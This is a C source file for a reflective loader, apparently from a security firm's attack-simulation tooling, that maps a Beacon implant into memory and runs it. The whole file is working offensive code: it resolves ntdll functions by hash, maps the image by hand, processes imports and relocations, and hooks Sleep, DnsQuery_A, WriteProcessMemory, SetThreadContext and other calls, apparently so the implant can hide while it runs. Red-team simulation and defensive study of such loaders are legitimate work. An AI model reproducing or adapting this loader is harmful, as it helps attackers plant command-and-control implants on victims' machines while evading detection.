/**
 *
 * Reflective Loader
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
**/

#include "Common.h"

typedef BOOLEAN ( WINAPI * DLLMAIN_T )(
		HMODULE	ImageBase,
		DWORD	Reason,
		LPVOID	Parameter
);

typedef struct
{
	D_API( NtAllocateVirtualMemory );
	D_API( NtProtectVirtualMemory );
	D_API( NtQueryVirtualMemory );
	D_API( RtlCreateHeap );
} API, *PAPI;

#define H_API_NTALLOCATEVIRTUALMEMORY		0xf783b8ec /* NtAllocateVirtualMemory */
#define H_API_NTPROTECTVIRTUALMEMORY		0x50e92888 /* NtProtectVirtualMemory */
#define H_API_NTQUERYVIRTUALMEMORY		0x10c0e85d /* NtQueryVirtualMemory */
#define H_API_RTLCREATEHEAP			0xe1af6849 /* RtlCreateHeap */
#define H_API_NTCLOSE				0x40d6e69d /* NtClose */
#define H_LIB_NTDLL				0x1edab0ed /* ntdll.dll */

#ifndef PTR_TO_HOOK
#define PTR_TO_HOOK( a, b )	U_PTR( U_PTR( a ) + G_SYM( b ) - G_SYM( Table ) )
#endif

/*!
 *
 * Purpose:
 *
 * Loads Beacon into memory and executes its 
 * entrypoint.
 *
!*/

D_SEC( B ) VOID WINAPI Titan( VOID )
{
	API				Api;
	MEMORY_BASIC_INFORMATION	Mbi;

	SIZE_T				Prm = 0;
	SIZE_T				SLn = 0;
	SIZE_T				ILn = 0;
	SIZE_T				Idx = 0;
	SIZE_T				MLn = 0;

	PVOID				Mem = NULL;
	PVOID				Map = NULL;
	DLLMAIN_T			Ent = NULL;
	PIMAGE_DOS_HEADER		Dos = NULL;
	PIMAGE_NT_HEADERS		Nth = NULL;
	PIMAGE_SECTION_HEADER		Sec = NULL;
	PIMAGE_DATA_DIRECTORY		Dir = NULL;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	RtlSecureZeroMemory( &Mbi, sizeof( Mbi ) );

	/* Initialize API structures */
	Api.NtAllocateVirtualMemory = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTALLOCATEVIRTUALMEMORY );
	Api.NtProtectVirtualMemory  = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTPROTECTVIRTUALMEMORY );
	Api.NtQueryVirtualMemory    = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYVIRTUALMEMORY );
	Api.RtlCreateHeap           = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLCREATEHEAP );

	/* Setup Image Headers */
	Dos = C_PTR( G_END() );
	Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
	Sec = IMAGE_FIRST_SECTION( Nth );

	/* Allocate Length For Hooks & Beacon */
	ILn = ( ( ( Nth->OptionalHeader.SizeOfImage ) + 0x1000 - 1 ) &~( 0x1000 - 1 ) );
	SLn = ( ( ( G_END() - G_SYM( Table ) ) + 0x1000 - 1 ) &~ ( 0x1000 - 1 ) );
	MLn = ILn + SLn;

	/* Create a page of memory that is marked as R/W */
	if ( NT_SUCCESS( Api.NtAllocateVirtualMemory( NtCurrentProcess(), &Mem, 0, &MLn, MEM_COMMIT, PAGE_READWRITE ) ) ) {
		
		/* Copy hooks over the top */
		__builtin_memcpy( Mem, C_PTR( G_SYM( Table ) ), U_PTR( G_END() - G_SYM( Table ) ) );

		/* Get pointer to PE Image */
		Map = C_PTR( U_PTR( Mem ) + SLn - Sec->VirtualAddress );

		/* Copy sections over to new mem */
		for ( Idx = 0 ; Idx < Nth->FileHeader.NumberOfSections ; ++Idx ) {
			__builtin_memcpy( C_PTR( U_PTR( Map ) + Sec[ Idx ].VirtualAddress ),
					  C_PTR( U_PTR( Dos ) + Sec[ Idx ].PointerToRawData ),
					  Sec[ Idx ].SizeOfRawData );
		};

		/* Get a pointer to the import table */
		Dir = & Nth->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_IMPORT ];

		if ( Dir->VirtualAddress ) {
			/* Process Import Table */
			LdrProcessIat( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ) );
			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x0e07cd7e, PTR_TO_HOOK( Mem, Sleep_Hook ) );
			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x84d15061, PTR_TO_HOOK( Mem, ReadFile_Hook ) );
			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xc165d757, PTR_TO_HOOK( Mem, ExitThread_Hook ) );
			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x8641aec0, PTR_TO_HOOK( Mem, DnsQuery_A_Hook ) );
			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xdecfc1bf, PTR_TO_HOOK( Mem, GetProcAddress_Hook ) );
			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x5775bd54, PTR_TO_HOOK( Mem, VirtualAllocEx_Hook ) );
			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xfd1438ae, PTR_TO_HOOK( Mem, SetThreadContext_Hook ) );
			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x5b6b908a, PTR_TO_HOOK( Mem, VirtualProtectEx_Hook ) );
			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x436e4c62, PTR_TO_HOOK( Mem, ConnectNamedPipe_Hook ) );
			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x5c3f8699, PTR_TO_HOOK( Mem, ReadProcessMemory_Hook ) );
			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0xb7930ae8, PTR_TO_HOOK( Mem, WriteProcessMemory_Hook ) );
			LdrHookImport( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), 0x0df1b3da, PTR_TO_HOOK( Mem, WaitForSingleObject_Hook ) );
		};

		/* Get a pointer to the relocation table */
		Dir = & Nth->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_BASERELOC ];

		if ( Dir->VirtualAddress ) {
			/* Process Relocations */
			LdrProcessRel( C_PTR( Map ), C_PTR( U_PTR( Map ) + Dir->VirtualAddress ), Nth->OptionalHeader.ImageBase );
		};

		/* Set Heap Parameters */
		SLn = SLn + Sec->SizeOfRawData;

		/* Give information about image */
		( ( PTABLE ) Mem )->RxBuffer    = U_PTR( Mem );
		( ( PTABLE ) Mem )->RxLength    = U_PTR( SLn );
		( ( PTABLE ) Mem )->ImageLength = U_PTR( MLn );

		/* Change Memory Protection. note: Work on supporting SLEEP_MASK here! */
		if ( NT_SUCCESS( Api.NtProtectVirtualMemory( NtCurrentProcess(), &Mem, &SLn, PAGE_EXECUTE_READ, &Prm ) ) ) {
			if ( NT_SUCCESS( Api.NtQueryVirtualMemory( NtCurrentProcess(), C_PTR( G_SYM( Start ) ), MemoryBasicInformation, &Mbi, sizeof( Mbi ), NULL ) ) ) {
				/* Execute EntryPoint. note: do some checking for SLEEP_MASK! */
				Ent = C_PTR( U_PTR( Map ) + Nth->OptionalHeader.AddressOfEntryPoint );
				Ent( C_PTR( Map ), 1, NULL );
				Ent( C_PTR( Mbi.AllocationBase ), 4, NULL );
			};
		};
	};
	return;
};
